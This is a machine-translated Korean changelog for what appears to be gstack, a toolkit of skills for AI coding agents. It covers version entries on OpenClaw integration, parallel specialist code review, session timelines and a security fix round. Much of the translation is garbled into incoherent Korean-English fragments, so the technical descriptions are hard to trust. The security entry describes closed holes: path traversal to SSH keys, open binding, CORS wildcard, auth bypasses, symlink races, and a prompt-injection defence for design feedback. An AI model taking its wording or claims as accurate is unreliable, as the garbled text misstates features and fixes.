4 방법론 기술 당신은 ClawHub를 통해 당신의 OpenClaw 에이전트에서 직접 설치할 수 있습니다, no Claude Code 회의 필요. 당신의 에이전트은 Telegram를 통해 대화로 달립니다.

### 추가

- **4개의 기본 OpenClaw ClawHub에 기술.** `clawhub install gstack-openclaw-office-hours gstack-openclaw-ceo-review gstack-openclaw-investigate gstack-openclaw-retro`로 설치하십시오. 순수한 방법론, no gstack 인프라. 사무실 시간 (375의 선), CEO 검토 (193), 조사 (136), 복고풍 (301).
- **AGENTS.md 파견 수정.** 수동으로 Claude Code를 열지에서 Wintermute를 중지하는 3개의 행동 규칙. 그것은 지금 종료 회의 자체. `openclaw/agents-gstack-section.md`에 준비에 파스 섹션.

### 변경

- OpenClaw `includeSkills`는 명확했습니다. Native ClawHub 기술은 bloated 생성한 버전 (각 10-25K 토큰을, 지금 순수한 방법론의 136-375의 선)를 대체합니다.
- docs/OPENCLAW.md 파견 여정 규칙과 ClawHub는 참고를 설치합니다.

## [0.15.9.0] - 2026-04-05. OpenClaw 통합 v2

gstack 를 OpenClaw 로 메서드리 소스로 연결할 수 있습니다. OpenClaw 은 ACP 을 통해 기본적으로 Claude Code 을 설정하고 gstack 은 계획 분야와 생각 프레임워크를 제공하여 세션을 더 잘 만듭니다.

### 추가

- **gstack-lite 계획 분야.** 15선 CLAUDE.md는 각 종말을 끄는 Claude Code 회의를 훈련된 건축업자로 읽습니다: 첫번째, 계획, 주위를 해결하십시오, 각자 검토, 보고. 시험되는 A/B: 2x 시간, 의미로 더 나은 산출.
- **gstack-full 파이프라인 템플릿.** 완전한 기능 빌드, 사슬 /autoplan, 구현, 그리고 /ship를 한 자치적인 흐름으로 구축합니다. 오케스트라는 작업을 떨어뜨리고 PR를 뒤로 옵니다.
- **OpenClaw의 4 가지 기본 방법론 기술.** Office hours, CEO review, 조사, 복고풍, 코딩 환경이 필요없는 대화 작업에 적합합니다.
- **4 층 파견 여정.** 단순 (no gstack), 중간 (gstack-lite), 무거운 (특수한 기술), 가득 차있는 (완전한 파이프라인). OpenClaw의 AGENTS.md를 위한 여정 가이드로 docs/OPENCLAW.md에서 문서화하는.
- **Spawned 세션 감지.** 설정 OPENCLAW_SESSION env var and gstack 자동 스키 인터랙티브 프롬프트, 작업 완료에 초점을 맞추고 있습니다. 오케스트라를 위해 작동, 뿐만 아니라 OpenClaw.
- **includeSkills 호스트 구성 필드.** SkipSkills (minus Skip 포함)와 함께 유니버셜 로직. 호스트는 모든 마이너스 -a-list 대신 필요한 기술을 만드도록 제작할 수 있습니다.
- **docs/OPENCLAW.md.의 경우** 전체 아키텍처 doc은 gstack가 OpenClaw, 프롬프트-스 브리지 모델과 통합하는 방법을 설명하고 NOT 건물 (no daemon, no 프로토콜, no 클로비스).

### 변경

- OpenClaw 호스트 구성 업데이트: 모든 31 대신 4개의 기본 기술을 생성합니다. staticFiles.SOUL.md (기본적으로 비합성 파일) 제거.
- 설정 스크립트는 이제 전체 설치 시도 대신 `--host openclaw`에 대한 리디렉션 메시지를 인쇄합니다.

## [0.15.8.1] - 2026-04-05. 커뮤니티 PR 삼기 + 오류 폴란드어

닫히는 12 중복 커뮤니티 PR, 합병 2 준비 PR (#798, #776), 그리고 모든 디자인 명령에 친절한 OpenAI 오류를 확장. 당신의 org가 확인되지 않은 경우, 당신은 지금 당신이 실행하는 명령을 디자인하는 JSON 덤프 대신 no 문제의 오른쪽 URL와 명확한 메시지를 얻을.

### 고정

- **모든 디자인 명령에 OpenAI org 오류가 있습니다.** 이전 `$D generate`는 사용자 친화적인 메시지를 보았을 때 org가 확인되지 않았습니다. 이제 `$D evolve`, `$D iterate`, `$D variants`, `$D check`를 모두 검증 URL와 같은 명확한 메시지를 보여줍니다.

### 추가

- **>128KB 회귀 시험 Codex 세션 발견.** 문서는 현재 버퍼 제한이 너무 미래 Codex 버전이 더 큰 session_meta를 가진 표면이 끊기 대신 청소하게 될 것입니다.

### 기여자

- 닫히는 12 중복 커뮤니티 PRs (6 Gonzih 보안 수정 v0.15.7.0, 6 stedfn 중복)에서 배송. Kept #752 오픈 (디자인 봉사의 링크 간격). @Gonzih, @stedfn, @itstimwhite 기여에 감사드립니다.

## [0.15.8.0] - 2026-04-04. 더 똑똑한 리뷰

코드 리뷰는 이제 결정에서 배울 수 있습니다. 일단 발견을 건너 뛰고 코드 변경까지 조용히 머물. 전문가는 자신의 발견과 함께 자동 조끼 테스트 스텁. 그리고 아무것도 찾을 수없는 침묵 전문가는 자동 평가를 빠르게 유지.

### 추가

- **Cross-review의 인기 호텔** 1개의 검토에서 발견을 건너 뛸 때, gstack는 기억합니다. 다음 검토에서는, 관련 코드가 바뀌지 않는 경우에, 발견은 억압합니다. No는 더 많은 것은 각 PR를 마다 동일한 의도적인 본을 재 스크리핑합니다.
- **stub 제안을 시험하십시오.** 전문가는 이제 각 발견과 함께 골격 시험을 포함할 수 있습니다. 시험은 프로젝트의 검출된 기구 (제스트, 바이트, RSpec, pytest, Go test)를 사용합니다. 시험 텁으로 찾기는 ASK 품목으로 표면을 얻고, 시험을 만들지 결정합니다.
- **Adaptive 전문 용어.** 제로 찾기가 자동 전환된 10+배 파견된 전문가. 보안 및 데이터 마이그레이션은 면제됩니다 (보험 정책은 항상 실행됩니다). `--security`, `--performance`, 등과 함께 모든 전문가를 강제하십시오.
- **Per-specialist stats 에 대한 리뷰 로그.** 모든 리뷰는 이제 전문가가 ran, 얼마나 많은 발견을 각 생산, 건너 뛰거나 문질러 갔다. 이 힘은 적응시키는 유혹을 제공하고 /retro 풍부한 데이터를 제공합니다.

## [0.15.7.0] - 2026-04-05. 보안 파 1

보안 감사 (#783)에 대한 14 개의 수정. 디자인 서버 no 더 긴 모든 인터페이스를 바인딩합니다. 경로 트레이널, auth 바이패스, CORS 와일드 카드, 세계 읽기 파일, 신속한 주입 및 symlink 레이스 조건 모두 폐쇄. @Gonzih 및 @garagon 포함의 커뮤니티 PR.

### 고정

- **Design 서버는 localhost만 바인딩합니다.** 이전 0.0.0.0을 경계, 와이파이에 누군가가 모의로 접근하고 모든 엔드포인트를 명중할 수 있다는 것을 의미. 이제 127.0.0.1 만, 검색 서버 일치.
- **/api/reload에 대한 경로 트래버스.** 이전에 디스크에 파일을 읽을 수 있었다 (를 포함하여 ~/.ssh/id_rsa) JSON 몸에 있는 임의 경로를 통과해서. 이제는 cwd 또는 tmpdir 내의 경로에 체재를 유효하게 합니다.
- **/inspector/events의 오스 게이트.** SSE 엔드포인트는 /activity/stream 필수 토큰이 있는 동안 무관하게 되었습니다. 이제 둘 다 동일한 Bearer 또는 ?token= 체크를 요구합니다.
- **디자인 피드백에 있는 신속한 주입 방위.** 사용자 피드백은 태그를 escaping으로 XML 신뢰 경계표에서 감싸입니다. 손상을 제한하기 위해 지속 5 반복에 걸린 피드백을 축적했습니다.
- **파일 및 디렉토리 권한이 강하게.** 모든 ~/.gstack/ 디어는 이제 모드 0o700, 0o600 파일로 생성되었습니다. 설정 스크립트는 umask 077을 설정합니다. Auth 토큰, 채팅 기록 및 브라우저는 no 더 긴 세계 읽기를 기록합니다.
- **TOCTOU 설정 symlink 생성의 레이스.** mkdir -p (idempotent) 이전에 존재 체크를 제거했습니다. 우선 대상은 링크를 생성하기 전에 symlink가 아닙니다.
- **CORS 와일드카드 제거.** 서버 no는 더 긴 접근 통제 Allow-Origin를 보냅니다: *. Chrome 연장은 host_permissions를 나타나고 영향을 미치지 않습니다. 교차로 요청을 만들기에서 악의적인 웹 사이트를 차단합니다.
- **쿠키 피커 auth 필수.** 이전 auth authToken이 정의되지 않은 경우. 이제 항상 Bearer token 를 모든 data/action 경로를 요구합니다.
- **/health token 확장 근원에 문지르는.** Auth token는 크롬 확장:// 근원에서 오는 경우에만 반환됩니다. 서버가 터널질 때 token 누출을 막을 때 token 누출을 방지합니다.
- **DNS 재조합 보호는 IPv6를 검사합니다.** AAAA 레코드는 현재 A 레코드에 따라 유효하게 됩니다. 블록 fe80:: 링크-현지 주소.
- **validateOutputPath에서 Symlink 우회.** 안전 감독 내부의 symlink를 잡기 위해 lexical validation 후에 해결되는 진짜 경로.
- **URL restoreState에 대한 검증.** 상태 파일 탬퍼를 방지하기 위해 항법의 앞에 유효한 저장된 URL을 저장했습니다.
- **Telemetry 엔드포인트는 anon 키를 사용합니다.** 서비스 역할 열쇠 (RLS)는 public 원격 측정 엔드포인트를 위한 anon 열쇠로 대체했습니다.
- **killAgent는 실제로 하위 처리를 죽입니다.** 크로스프로세스는 kill-file + polling을 통해 신호를 죽이고 있습니다.

## [0.15.6.2] - 2026-04-04. 안티 스키 검토 규칙

검토 기술이 이제 모든 섹션이 평가되지 않도록 시행한다. 계획 유형에 관계없이. No 더 많은 "이 전략은 doc 그래서 구현 섹션이 적용되지 않습니다." 섹션이 실제로 플래그가없는 경우, 그렇게 말하고 이동하지만, 당신은 볼 수 있습니다.

### 추가

- **모든 4 리뷰 기술에 대한 안티 스키 규칙.** CEO 리뷰 (구 1-11), eng 검토 (구 1-4), 디자인 리뷰 (구 1-7을 통과), 그리고 DX 리뷰 (구 1-8를 통과) 모든 섹션의 명시적 평가가 필요합니다. 모델은 계획 유형이 부과되는 것을 주장하여 no 더 긴 건너뛰기 섹션을 할 수 있습니다.
- **CEO 검토 헤더 수정.** 실제 섹션 카운트 (Section 11은 조건하지만 존재)와 일치하기 위해 "11 섹션"에 "10 섹션"을 수정했습니다.

## [0.15.6.1] - 2026-04-04

### 고정

- **기술 접두사 각자 치유.** 설정은 `gstack-relink` 을 연결 기술 후 최종 일관성 검사로 실행합니다. 중단된 설정이면, stale git state 또는 `skill_prefix: false` 을 동기화하는 `name:` 필드를 왼쪽으로 업그레이드하면, 설정은 다음 실행에 자동 수정됩니다. No 더 `/gstack-qa` 을 원할 때 `/qa` 를 선택합니다.

## [0.15.6.0] - 2026-04-04. 선언 멀티 호스트 플랫폼

새로운 코딩 에이전트를 gstack에 추가하는 것은 9 파일을 터치하고 `gen-skill-docs.ts`의 내부를 알고. 이제는 TypeScript 구성 파일과 재 수출입니다. Zero 코드는 다른 곳에서 변경됩니다. 자동 모수를 테스트합니다.

### 추가

- **선언 호스트 설정 시스템.** 각 호스트는 `hosts/*.ts`의 `HostConfig` 객체를 입력했습니다. 발전기, 설정, 기술 검사, 플랫폼 감지, 제거 및 worktree 복사는 모두 하드 코딩된 스위치 문 대신 구성을 소모합니다. 호스트 = 하나 이상의 파일 + 재 수출을 `hosts/index.ts`에 추가합니다.
- **4개의 새로운 호스트: OpenCode, Slate, Cursor, OpenClaw.** `bun run gen:skill-docs --host all`는 지금 8명의 주인을 위해 생성합니다. 각은 0 `.claude/skills` 경로 누설으로 산출된 유효 SKILL.md를 일으킵니다.
- **OpenClaw 접합기.** OpenClaw는 잡종 접근을 가져옵니다: paths/frontmatter/detection + semantic 도구 매핑을 위한 포스트 가공 접합기 (Bash→exec, Agent→sessions_spawn, AskUserQuestion→prose). `staticFiles` config를 통해 `SOUL.md`를 포함합니다.
- **106 새로운 테스트.** 71은 구성 유효성 검사를 위해 시험합니다, HOST_PATHS derivation, 수출 CLI, 황금 파일 회귀 및 per-host 정정. 모든 7개의 외부 주인 (출력 존재, no 경로 누설, frontmatter 유효한, 신선도, 건너뛰기 규칙)를 덮는 35 모수화된 연기 시험.
- **`host-config-export.ts` CLI.** `list`, `get`, `detect`, `validate`, `symlinks` 명령을 통해 bash 스크립트에 호스트 구성을 노출합니다. No YAML bash에 필요한 파싱.
- **기여자 `/gstack-contrib-add-host` 기술.** 새로운 호스트 구성 작성 안내. `contrib/` 에서 라이브, user installs에서 제외.
- **골든 파일 기본.** Claude, Codex, 공장에 ship/SKILL.md의 스냅샷은 동일한 출력을 생성한다.
- **Per-host는 README에 대한 지침을 설치합니다.** 각 지원되는 에이전트에는 그것의 자신의 사본 맛은 구획을 설치합니다.

### 변경

- **`gen-skill-docs.ts`는 이제 설정 구동입니다.** EXTERNAL_HOST_CONFIG, transformFrontmatter host branch, path/tool는 if-chains, ALL_HOSTS array, 기술 건너뛰기 논리를 모두 구성으로 대체합니다.
- **`types.ts` derives Host configs에서 타입.** No 더 단단한 `'claude' | 'codex' | 'factory'`. HOST_PATHS는 각 구성의 globalRoot/usesEnvVars에서 동적인 쌓아 올렸습니다.
- **Preamble, co-author trailer, 해결사 억제 모든 config에서 읽습니다.** hostConfigDir, co-author strings, per-host switch 문 대신 호스트 구성에 의해 구동되는 억제제.
- **`skill-check.ts`, `worktree.ts`, `platform-detect` 이더레이트 설정.** No per-host 블록을 유지.

### 고정

- **Sidebar E2E 테스트는 이제 자체 유지됩니다.** 고정된 stale URL sidebar-url-accuracy에 있는 assertion, 단순화된 sidebar-css-interaction 작업. 모든 3개의 sidebar 시험은 외부 브라우저 의존성 없이 통과합니다.

## [0.15.5.0] - 2026-04-04. 대화 형 DX 검토 + 계획 모드 기술 수정

`/plan-devex-review`는 100 CLI 도구를 사용하는 개발자 옹호자들과 함께 앉아서 느낄 수 있습니다. 속도 실행 8 점수 대신 개발자가 무엇인지 묻습니다. 경쟁사의 배후에 대한 벤치 마크를 벤치마킹하면 마법의 순간을 디자인하고, 모든 마찰 포인트를 추적합니다.

### 추가

- **개발자 인 komana interrogation.** 검토는 WHO를 요구해서 시작됩니다. 개발자는 구체적인 아치형 (YC 설립자, 플랫폼 엔지니어, frontend dev, OSS contributor)와 더불어 입니다. 검토의 나머지를 위한 persona 모양 각 질문.
- **대화 시작자로 공감.** 첫 번째 사람 "나는 단지 도구를 발견 개발자입니다 ..." walkthrough는 모든 득점 시작 전에 반응에 대해 당신에게 보여집니다. 당신은 그것을 수정하고, 수정 된 버전은 계획으로 이동합니다.
- **경쟁 DX 벤치마킹.** WebSearch는 경쟁사의 TTHW와 내장 접근법을 찾아냅니다. 대상 계층 (Champion < 2min, 경쟁력있는 2-5min, 또는 현재 트레이드)를 선택하십시오. 즉, 대상은 모든 패스를 통해 당신을 따르십시오.
- **매직 순간 디자인.** 개발자가 "oh wow" 순간을 경험해야 하는 방법을 선택: 놀이터, 데모 명령, 비디오, 또는 가이드 튜토리얼, 노력/tradeoff 분석.
- **3개의 검토 형태.** DX EXPANSION (최고 종류를 위한push), DX POLISH (모든 접촉점을 bulletproof), DX TRIAGE (직경 간격만, 배 빨리).
- **의 여행 tracing.** 정적 테이블 대신, 검토 추적 실제 README/docs 경로와 마찰 점 당 AskUserQuestion를 요청합니다.
- **첫 번째 개발자 역할 놀이.** 실제 문서와 코드에 기반한 인사이트의 타임 스탬프 혼란 보고서.

### 고정

- **계획 모드 중 기술 invocation.** 계획 모드 중 기술 (`/plan-ceo-review`와 같이)를 호출 할 때, Claude는 이제 그것을 무시하고 출구로 시도하는 대신 실행 가능한 지시로 그것을 대우합니다. 적재된 기술은 일반적인 계획 형태 행동에 전진합니다. STOP 점은 실제로 멈추습니다. 이 고침은 각 기술의 전진에 있는 배를 고쳤습니다.

## [0.15.4.0] - 2026-04-03. Autoplan DX 통합 + 문서

`/autoplan` 이제 자동 감지 개발자 계획과 실행 `/plan-devex-review` 단계 3.5로, 전체 듀얼-voice adversarial 검토 (Claude subagent + Codex). 계획이 API, CLI, SDK, 에이전트 동작을 언급하는 경우, 또는 모든 개발자는 DX 검토가 자동으로 시작됩니다. No 추가 명령이 필요합니다.

### 추가

- **DX /autoplan의 리뷰.** 단계 3.5는 개발자를 위한 범위가 검출될 때 Eng 검토 후에 실행합니다. DX-specific 이중 음성, consensus 테이블 및 가득 차있는 8 차원 scorecard를 포함합니다. APIs, CLIs, SDK, 포탄 명령, Claude Code 기술, OpenClaw 활동, MCP 서버 및 어떤 dev든지 실행하거나 디버그에 Triggers.
- **"Which review?" README의 비교표.** 빠른 참고는 개발자 vs 아키텍처를 위한 최종 사용자를 위한 사용 검토를 보여주는, `/autoplan`가 3개 모두 다를 때.
- **`/plan-devex-review` 및 `/devex-review` 설치 지침.** 복사 파스트에 나열된 두 기술이 즉시 발견되어 있습니다.

### 변경

- **Autoplan 파이프라인 순서.** 이제 CEO → Design → Eng → DX (CEO → Design → Eng)를 운영하고 있습니다. DX는 건축의 장점이 있기 때문에 지속됩니다.

## [0.15.3.0] - 2026-04-03. 개발자 경험 검토

이제 코드를 작성하기 전에 DX 품질에 대한 계획을 검토 할 수 있습니다. `/plan-devex-review` 비율 8 차원 (시작, API 디자인, 오류 메시지, 문서, 업그레이드 경로, dev 환경, 지역 사회, 측정) 0-10 리뷰 전반에 걸쳐 추세 추적. 배송 후, `/devex-review`는 실제로 라이브 경험을 테스트하고 계획 단계 점수에 대한 비교를 사용하여 검색 도구를 사용합니다.

### 추가

- **/plan-devex-review 기술.** 플랜 스테이지 DX Addy Osmani의 프레임워크를 기반으로 검토합니다. 자동 감지 제품 유형 (API, CLI, SDK, 라이브러리, 플랫폼, docs, Claude Code 기술). 개발자 엠비시 시뮬레이션, DX 스코프를 트렌드로, 조건 Claude Code Skill DX 체크리스트를 포함합니다.
- **/devex-review 기술.** 라이브 DX 검색 도구를 사용하여 감사. 테스트 docs, 시작 흐름, 오류 메시지, 그리고 CLI 도움. 각 차원은 TESTED, INFERRED, 또는 스크린 샷 증거와 N/A로 점수를 매겼습니다. 붐비는 비교: 계획은 TTHW 3 분이 될 것이라고, 현실은 말한다. 8.
- **DX 명예의 전당.** 줄무늬, Vercel, Elm, Rust, htmx, Tailwind 등에서 주문한 예로, 신속한 bloat를 피하기 위해 검토 패스 당로드됩니다.
- **`{{DX_FRAMEWORK}}` 해결자.** 공유 DX 원리, 특성, 그리고 두 기술을 위해 윤활유를 scoring. 콤팩트 (~150의 선) 그래서 그것은 맥락을 먹지 않습니다.
- **DX 대시보드에 대한 리뷰.** 두 기술 모두 검토 로그에 작성하고 검토 Readiness Dashboard에서 CEO, Eng, and Design review를 따라 표시합니다.

## [0.15.2.1] - 2026-04-02. 설정은 마이그레이션을 실행

`git pull && ./setup` 이제 버전 마이그레이션을 자동으로 적용합니다. 이전 버전 마이그레이션은 `/gstack-upgrade` 동안만 랜을 마이그레이션하므로 git pull를 통해 업데이트한 사용자는 state fixes (v0.15.1.0에서 기술 디렉토리 재구성과 동일)를 얻지 못했습니다. 이제 `./setup`는 마지막 버전이 실행되고 모든 마이그레이션을 적용 할 수 있습니다.

### 고정

- **설정은 마이그레이션을 종료합니다.** `./setup` 이제 `~/.gstack/.last-setup-version`를 확인하고 그 버전보다 더 새로운 마이그레이션 스크립트를 실행합니다. No `git pull` 이후 더 부서진 기술 디렉터리.
- **우주 안전 이동 루프.** `for` 루프 대신 `while read`를 사용하여 공간에 올바르게 접근할 수 있습니다.
- **Fresh installs 건너뛰기** 새 설치는 그에 적용되지 않는 역사적인 마이그레이션을 실행하지 않고 버전 마커를 작성합니다.
- **미래 이민 감시.** 현재 VERSION보다 더 새로운 버전의 마이그레이션은 개발 지점에서 조기 실행을 방지하고 있습니다.
- **VERSION 가드를 미스링합니다.** VERSION 파일이 absent인 경우, 버전 마커는 영구 마이그레이션 독소를 방지하지 않습니다.

## [0.15.2.0] - 2026-04-02. 음성 친절하게 기술 삼총

`/cso`를 기억하는 대신 "보안 체크"를 말하십시오. 기술에는 지금 AquaVoice, Whisper 및 다른 연설에 텍스트 도구와 함께 작동하는 음성 친절한 방아쇠 구문이 있습니다. No는 잘못되는 약자로 싸우는 더 많은 전투 ("CSO" -> "CEO" -> 잘못된 기술).

### 추가

- **10개의 기술을 위한 음성 방아쇠.** 각 기술은 자연 언어 별명으로 구워진 그것의 묘사로 구워집니다. "see-so", "security review", "tech review", "code x", "speed test" 등. 오른쪽 기술은 명령 이름을 앵글 때도 활성화합니다.
- **`voice-triggers:` YAML 템플릿에 필드.** 구조화: `.tmpl` frontmatter, `gen-skill-docs`가 세대 도중 설명으로 그(것)들을 접습니다. 청결한 근원, 청결한 산출.
- **README의 음성 입력 섹션.** 새로운 사용자는 일에서 음성과 기술 일을 알고 있습니다.
- **`voice-triggers` CONTRIBUTING.md에 문서화.** Frontmatter 계약이 업데이트되었으므로 기여자는 필드가 존재합니다.

## [0.15.1.0] - 2026-04-01. 샷건 없이 디자인

`/design-shotgun`를 처음 실행하지 않고 `/design-html`를 실행할 수 있습니다. 기술은 디자인 컨텍스트가 존재하는 것을 감지합니다 (CEO 계획, 디자인 검토 artifacts, 승인된 모조) 당신은 진행하는 방법을 물어. 계획에서 시작, 설명, 또는 제공된 PNG, 승인된 모조는 아닙니다.

### 변경

- **`/design-html`는 어떤 시작점든지에서 작동합니다.** 3개의 여정 형태: (a)는 /design-shotgun, (B) CEO 계획 및/or 디자인 변종 없이 공식적인 승인, (C) 청결한 슬레이트에서 다만 묘사를 찬성했습니다. 각 형태는 적당한 질문을 요구하고 그러므로 진행합니다.
- **AskUserQuestion 누락된 컨텍스트를 위해.** 대신 "no 승인 된 디자인이 발견 된 상태에서 차단,"기술은 이제 선택 사항 제공 : 계획 기술을 먼저 실행, PNG을 제공, 또는 그냥 당신이 원하는 것을 설명하고 디자인 라이브.

### 고정

- **지금 스킬은 최고 수준의 이름으로 발견됩니다.** 설정은 디렉토리 symlink 대신 SKILL.md symlinks와 실제 디렉토리를 만듭니다. Claude 자동 접두사 기술 이름을 `gstack-`를 사용하면 `--no-prefix` 모드를 사용합니다. `/qa`는 이제 `/qa`, `/gstack-qa`가 아닌 `/gstack-qa`가 됩니다.

## [0.15.0.0] - 2026-04-01. 세션 인텔리전스

AI 세션은 이제 무슨 일이 있었는지 기억합니다. 계획, 리뷰, 체크포인트 및 건강 점수는 세션 전반에 걸쳐 컨텍스트 컴팩트 및 화합물을 살아남습니다. 모든 기술은 타임 라인 이벤트를 작성하고, 프리 어블은 시작에 최근의 artifacts를 읽습니다. 에이전트가 왼편을 알고 있습니다.

### 추가

- **세션 타임라인.** 모든 기술 자동 로그인 시작 /complete 이벤트 `timeline.jsonl`. 로컬 전용, 결코 어디서나 전송하지, 항상 원격 측정 설정에 관계없이. /retro 이제 3 가지 지점에서 "이주: 3 /review, 2 /ship를 표시 할 수 있습니다.
- **Context 복구.** 컴팩트 또는 세션 시작 후, 이전 목록 최근 CEO 계획, 체크 포인트 및 리뷰. 에이전트는 당신이 자신을 반복하지 않고 결정과 진행을 복구하는 가장 최근의 것을 읽습니다.
- **교차하는 소유주.** 세션 시작에, preamble는 이 branch와 최신 체크포인트에서 마지막 기술을 실행합니다. 당신은 "마지막 세션을 참조하십시오: /review (수요)"를 입력하기 전에.
- **예측 능력 제안.** branch에 마지막 3 세션이 패턴을 따르는 경우 (검토, 배, 리뷰), gstack는 다음을 원하는 것을 제안합니다.
- **감사합니다.** 세션은 한 단계의 간단한 합성: branch 이름, 마지막 기술, 체크포인트 상태, 건강 점수.
- **`/checkpoint` 기술.** 저장하고 재시작 작업 상태 스냅샷. 캡처 git 상태, 결정, 남아있는 작업. 에이전트 사이에 지휘자 작업 공간 핸드오프에 대 한 크로스 브레이크 목록을 지원 합니다.
- **`/health` 기술.** 코드 품질 scorekeeper. 프로젝트의 도구 (tsc, biome, knip, shellcheck, test)를 포장하고, 복합 0-10 점수를 계산하고, 시간이 지남에 따라 추세를 추적합니다. 점수가 떨어지면, 변경되는 것을 정확히 알려줍니다.
- **타임 라인 binaries.** `bin/gstack-timeline-log`와 `bin/gstack-timeline-read`는 부록 JSONL 타임라인 저장을 위해.
- **규칙을 추적.** /checkpoint와 /health는 기술 여정 주입에 추가했습니다.

## [0.14.6.0] - 2026-03-31. 자발적인 자기 개선

gstack 이제 자신의 실수에서 배웁니다. 모든 기술 세션은 조작 장애 (CLI 오류, 잘못된 접근, 프로젝트 quirks)를 캡처하고 향후 세션에서 표면. No 설정 필요, 그냥 작동합니다.

### 추가

- **조작상 각자 개량.** 명령이 실패하거나 프로젝트 별 gotcha를 명중했을 때, gstack 로그를 기록합니다. 다음 세션은 기억합니다. "분 테스트 필요 --timeout 30000"또는 "login 흐름은 cookie 가져오기를 먼저 필요로합니다" ... 당신이 그것을 잊을 때마다 10 분을 낭비하는 물건의 종류.
- **사전 학습에 대한 요약.** 프로젝트가 5+ 학습을 갖는 경우, gstack는 각 세션의 시작에 상위 3을 보여주기 때문에, 당신은 작동하기 전에 그들을 볼 수 있습니다.
- **13개의 기술이 지금 학습합니다.** 사무실 시간, 계획소 검토, 계획 - eng 검토, 계획 설계 - 리뷰, 디자인 - 리뷰, 디자인 - 소, qa, qa - 전용, 그리고 지금 이전 학습을 복고풍 AND 새로운 것을 기여. 너무 이른 리뷰, 배, 조사는 유선.

### 변경

- **Contributor 모드 교체.** 오래된 기여자 모드 (수동 선택, 마크 다운 보고서 ~/.gstack/contributor-logs/) 무거운 사용의 18 일에서 불을 붙지 않습니다. 어떤 설정 없이 동일한 통찰력을 캡처 자동 조작 학습으로 대체.

### 고정

- **학습 쇼 E2E 테스트 슬러그 잡기.** 하드 코딩된 경로에 대한 테스트 시드 학습하지만 gstack-slug는 실행 시간에 다른 길을 계산했습니다. 이제는 슬러그를 동적으로 계산합니다.

## [0.14.5.0] - 2026-03-31. 배 Idempotency + 기술 접두사 고침

`/ship`가 실패한 push 또는 PR가 no를 창조한 후에 no를 더 긴 두 배 범프 당신의 버전 또는 duplicates 당신의 CHANGELOG를 창조합니다. 그리고 `--prefix` 형태를 사용하는 경우에, 당신의 기술 이름은 실제로 작동합니다.

### 고정

- **`/ship`는 이제 idempotent (#649)입니다.** If push succeeds but PR creation fails (API outage, rate limit), re-running `/ship` detects the already-bumped VERSION, skips the push if already up to date, and updates the existing PR body instead of creating a duplicate. The CHANGELOG step was already idempotent by design ("replace with unified entry"), so no guard needed there.
- **기술 접두사 실제로 `name:`에서 SKILL.md (#620, #578)를 깁습니다.** `./setup --prefix`와 `gstack-relink`는 이제 각 기술 SKILL.md frontmatter에 있는 `name:` 분야를 접두어 놓습니다 미리 고침 조정합니다. 이전으로, symlinks는 접두어 졌지만 Claude Code는 unprefixed `name:` 분야를 읽고 전 접두사를 무시했습니다. 처리한 가장자리 상자: `gstack-upgrade` 두 배 접두어, 뿌리 `gstack` 기술은 결코 사전 고침된 이름, 본래 제거를 결코 읽었습니다.
- **`gen-skill-docs` 전사 패치가 다시 승인해야 할 때 경고.** SKILL.md 파일을 재생한 후 `skill_prefix: true`가 설정되면, `gstack-relink`를 실행하는 경고 알림을 나타냅니다.
- **PR idempotency 체크는 국가를 엽니다.** PR 가드가 이제 PR 가 `OPEN` 를 정의하여 새 PR 생성을 막지 않습니다.
- **`--no-prefix` 주문 버그.** `gstack-patch-names`는 `link_claude_skill_dirs` 이전에 실행됩니다. 이렇게 symlink 이름은 올바른 패치 값을 반영합니다.

### 추가

- **`bin/gstack-patch-names` 공유 헬퍼.** DRY `setup`와 `gstack-relink` 둘 다에 의해 이용된 이름 패칭 논리의 적출. 휴대용 `mktemp + mv` sed를 가진 모든 가장자리 케이스 (no frontmatter, 이미 접힌, 불행하게 한 접힌 제광자)를 취급하십시오.

### 기여자

- 이름 4 단위 시험: `relink.test.ts`에서 깁기
- gen-skill-docs prefix 경고 2 테스트
- 1 E2E 선박용 테스트 idempotency (periodic tier)
- `setupMockInstall`를 SKILL.md를 적절한 frontmatter로 작성

## [0.14.4.0] - 2026-03-31. 육군 검토 : 병렬 전문가 검토자

모든 `/review`는 이제 평행한 전문가에게 에이전트을 파견합니다. 1개의 에이전트이 1개의 거인 검수소를 적용하는 대신, 당신은 시험 간격, 유지성, 안전, 성과, 자료 이동, API 계약 및 adversarial 빨간teaming를 위한 집중된 검토자를 얻습니다. 각 전문가는 신선한 상황에, 산출 구조화된 JSON 발견, 및 주요 에이전트 합병, deduplicates 및 다수 신뢰가 동일한 문제점을 때 diff를 자주적으로 읽습니다. 작은 디프 (<50 라인)는 전적으로 속도를 위해 전문가를 건너 뛰습니다. 큰 디프 (200 + 라인)는 최고에 대한 Adversarial 분석을 위한 빨간 팀을 활성화합니다.

### 추가

- **7명의 전문가 리뷰**는 Agent tool subagents를 통해 평행으로 달리는 것을. 항상에: 시험 + 유지 가능성. 조건: 안전 (auth 범위), 성과 (backend/frontend), 자료 마이그레이션 (이동 파일), API 계약 (제어기/routes), 빨간 팀 (큰 디퓨즈 또는 긴 결과).
- **JSON 삽을 찾는다.** 특수 검사는 구조상 JSON 물체를 severity, 신뢰, 경로, 선, 종류, 고침 및 지문 분야로 출력했습니다. 믿을 수 있는 파싱, no 더 관 분리된 원본.
- **지문 기반 탈취.** 두 개의 전문가가 동일한 파일에 플래그를 때 : 종류, 발견은 신뢰를 밀어 얻고 "MULTI-SPECIALIST CONFIRMED" 마커.
- **PR 품질 점수.** 모든 리뷰는 0-10 품질 점수를 따릅니다. `10 - (critical * 2 + informational * 0.5)`. `/retro`를 통해 동향을 위한 역사를 검토하는 기록에 기록된.
- **3개의 새로운 diff-scope 신호.** `gstack-diff-scope`는 이제 SCOPE_MIGRATIONS, SCOPE_API, SCOPE_AUTH를 감지하여 적절한 전문가를 활성화시킵니다.
- **학습에 기반한 전문 프롬프트.** 각 전문가는 빠른 속도로 도메인에 대한 과거 학습을 얻고 있으므로 리뷰는 더 똑똑해집니다.
- **14 새로운 디프스코 검사** 3개의 새로운 것을 포함하여 모든 9개의 범위 신호를 덮기.
- **7 새로운 E2E 테스트** (5 문, 2 주기적인) 덮음 이동 안전, N+1 탐지, 납품 감사, 질 점수, JSON schema 수락, 빨간 팀 활성화 및 다 특기 consensus.

### 변경

- **리뷰 목록이 다시되었습니다.** 카테고리는 전문가 (테스트 격차, 죽은 코드, 마법 번호, 성능, 암호화)가 메인 체크리스트에서 제거되었습니다. 주요 에이전트는 CRITICAL 패스에만 초점을 맞추고 있습니다.
